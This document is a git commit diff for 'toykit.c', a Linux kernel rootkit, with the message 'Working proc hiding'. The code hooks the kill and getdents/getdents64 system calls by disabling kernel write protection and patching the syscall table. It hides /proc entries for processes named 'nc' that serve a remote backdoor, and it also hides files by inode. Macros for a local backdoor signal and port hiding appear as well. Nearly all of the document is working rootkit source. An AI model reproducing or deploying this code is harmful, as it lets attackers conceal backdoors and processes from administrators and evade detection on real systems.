fdab22a63ee280238959509f2f2d64c1a58d2dee
Josh Imhoff <joshimhoff13@gmail.com>
2013-05-09 19:13:02 -0400

    Working proc hiding

--- toykit.c
+++ toykit.c
@@ -11,11 +11,6 @@
 #include <linux/string.h>
 #include <linux/fdtable.h>
 
-// TODO 
-// Better proc hiding
-// Cite sources and write report
-// Bug fix in getdents
-
 // for local backdoor
 #define LOCAL_PID 12345
 #define LOCAL_SIG 31
@@ -27,7 +22,7 @@
 #define HIDE_PROC "nc" // for remote backdoor
 
 // for port hiding
-#define HIDE_PORT "04D2" // 1234 for hex
+#define HIDE_PORT "04D2" // 1234 in hex
 
 // for writing to sys_call_table
 #define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000))
@@ -78,24 +73,9 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	return actual_result;
 }
 
-// for getting a filename from a fd
-void getPathnameFromFD(unsigned int fd, char *pathname, char *buf)
-{
-	struct files_struct *current_files; 
-	struct fdtable *files_table;
-	struct path file_path;
-
-	current_files = current->files;
-	files_table = files_fdtable(current_files);
-
-	file_path = files_table->fd[fd]->f_path;
-	pathname = d_path(&file_path,buf,256*sizeof(char));
-}
-
 // for checking a process name against HIDE_PROC
 int checkProcName(long pid)
 {
-	//printk(KERN_INFO "In checkProcName, %s\n",pid_task(find_vpid(pid),PIDTYPE_PID)->comm);
 	if (strcmp(pid_task(find_vpid(pid),PIDTYPE_PID)->comm,HIDE_PROC) == 0)
 		return 1;
 	return 0;
@@ -123,10 +103,23 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	char *kdirp; // char buffer so we can do pointer arithmetic by byte
 	struct linux_dirent *d;
 
+	struct files_struct *current_files; 
+	struct fdtable *files_table;
+	struct path file_path;
+	char pbuf[256], *pathname = NULL;
+	long pid = 0; // uninited
+
 	// run real getdents 
 	result = (*orig_getdents)(fd,dirp,count);
 	if (result <= 0)
 		return result;
+
+	// get pathname
+	current_files = current->files;
+	files_table = files_fdtable(current_files);
+
+	file_path = files_table->fd[fd]->f_path;
+	pathname = d_path(&file_path,pbuf,256*sizeof(char));
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -136,18 +129,30 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 	if (copy_from_user(kdirp,dirp,result))
 		return -1;
 
-	// check result for files to hide
-	for (bp = 0; bp < result;) {
+	// check dirp for "files" to hide
+	for (bp = 0; bp < result; bp += d->d_reclen) {
 		d = (struct linux_dirent *) (kdirp + bp);
-		list_for_each_entry(ptr,&hidden_files,list) {
-			if (d->d_ino == ptr->inode) {
+		// process hiding
+		if (!strcmp(pathname,"/proc")) {
+			kstrtol(d->d_name,10,&pid);
+			if ((pid > 0) && checkProcName(pid)) {
 				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
 				bp -= d->d_reclen;
 			}
 		}
-		bp += d->d_reclen;
+		// file hiding
+		else {
+			list_for_each_entry(ptr,&hidden_files,list) {
+				if (d->d_ino == ptr->inode) {
+					memmove(kdirp + bp,kdirp + bp + d->d_reclen,
+						result - bp - d->d_reclen);
+					result -= d->d_reclen;
+					bp -= d->d_reclen;
+				}
+			}
+		}
 	}
 
 	// copy from kernel to userspace
@@ -200,15 +205,12 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		return -1;
 
 	// check dirp for "files" to hide
-	for (bp = 0; bp < result;) {
+	for (bp = 0; bp < result; bp += d->d_reclen) {
 		d = (struct linux_dirent64 *) (kdirp + bp);
 		// process hiding
 		if (!strcmp(pathname,"/proc")) {
-			//printk(KERN_INFO "After /proc check,%s\n",d->d_name);
 			kstrtol(d->d_name,10,&pid);
-			//printk(KERN_INFO "Before pid check,%ld\n",pid);
 			if ((pid > 0) && checkProcName(pid)) {
-				printk(KERN_INFO "Found pid to hide\n");
 				memmove(kdirp + bp,kdirp + bp + d->d_reclen,
 					result - bp - d->d_reclen);
 				result -= d->d_reclen;
@@ -226,7 +228,6 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 				}
 			}
 		}
-		bp += d->d_reclen; // TODO should go in loop
 	}
 
 	// copy from kernel to userspace
